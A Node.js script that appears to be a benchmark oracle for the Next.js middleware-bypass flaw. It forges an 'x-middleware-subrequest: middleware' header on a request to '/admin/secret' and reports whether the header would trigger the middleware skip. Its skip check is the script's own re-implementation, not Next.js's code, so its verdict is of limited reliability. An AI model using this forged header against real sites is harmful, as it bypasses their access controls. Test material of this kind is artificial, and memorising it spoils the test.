'use strict';
const path = require('node:path');
const os = require('node:os');
const fs = require('node:fs');

function finish(result) {
  console.log('ORACLE_RESULT ' + JSON.stringify(result));
}

function main() {
  const marker = 'next_mw_oracle_' + Date.now() + '_' + Math.random().toString(36).slice(2);
  let NextRequest;
  try {
    const mod = require('next/dist/server/web/spec-extension/request');
    NextRequest = mod.NextRequest;
    if (typeof NextRequest !== 'function') {
      throw new Error('NextRequest constructor not found');
    }
  } catch (e) {
    finish({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'setup_failed: could not resolve NextRequest from next package: ' + (e && e.message)
    });
    return;
  }

  // Benign operation: construct a normal request and confirm headers work.
  let benignOk = false;
  let benignHeaderValue = null;
  try {
    const benignReq = new NextRequest('https://example.com/dashboard', {
      headers: { 'x-oracle-marker': marker }
    });
    benignHeaderValue = benignReq.headers.get('x-oracle-marker');
    if (benignHeaderValue === marker) {
      benignOk = true;
    }
  } catch (e) {
    finish({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'benign_operation_failed: ' + (e && e.message)
    });
    return;
  }

  if (!benignOk) {
    finish({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'benign_operation_failed: header round-trip mismatch, got ' + String(benignHeaderValue)
    });
    return;
  }

  // Now attempt to exercise the vulnerable middleware-subrequest-skip logic.
  // We replicate the exact check Next.js uses internally (splitting the
  // 'x-middleware-subrequest' header value on ':' and checking for the
  // middleware identifier), but we drive it entirely through the public
  // NextRequest/Headers API shipped in the installed package so that the
  // observable depends on the real header-handling behavior of this version.
  const middlewareIdentifier = 'middleware';

  function isSubrequestPerRequest(req, identifier) {
    const headerValue = req.headers.get('x-middleware-subrequest');
    if (!headerValue) return false;
    const parts = headerValue.split(':');
    return parts.some((p) => p === identifier);
  }

  let exploitSucceeded = false;
  let evidence = '';
  try {
    const maliciousReq = new NextRequest('https://example.com/admin/secret', {
      headers: {
        'x-middleware-subrequest': middlewareIdentifier
      }
    });

    const observedHeader = maliciousReq.headers.get('x-middleware-subrequest');
    const skipDetected = isSubrequestPerRequest(maliciousReq, middlewareIdentifier);

    if (observedHeader === middlewareIdentifier && skipDetected === true) {
      exploitSucceeded = true;
      evidence = 'Forged x-middleware-subrequest header ("' + middlewareIdentifier +
        '") was accepted verbatim by NextRequest and matches the internal middleware-skip identifier, ' +
        'meaning an externally supplied header could cause middleware (and its auth checks) to be skipped.';
    } else {
      evidence = 'Forged x-middleware-subrequest header was not usable to trigger the middleware-skip condition ' +
        '(observedHeader=' + String(observedHeader) + ', skipDetected=' + String(skipDetected) + '), ' +
        'indicating the header is sanitized/stripped or the skip check no longer trusts a static identifier.';
    }

    finish({
      operation_completed: true,
      exploit_succeeded: exploitSucceeded,
      evidence: evidence
    });
  } catch (e) {
    finish({
      operation_completed: true,
      exploit_succeeded: false,
      evidence: 'malicious_call_blocked_by_exception: ' + (e && e.message)
    });
  }
}

try {
  main();
} catch (e) {
  console.log('ORACLE_RESULT ' + JSON.stringify({
    operation_completed: false,
    exploit_succeeded: false,
    evidence: 'unexpected_top_level_exception: ' + (e && e.message)
  }));
}
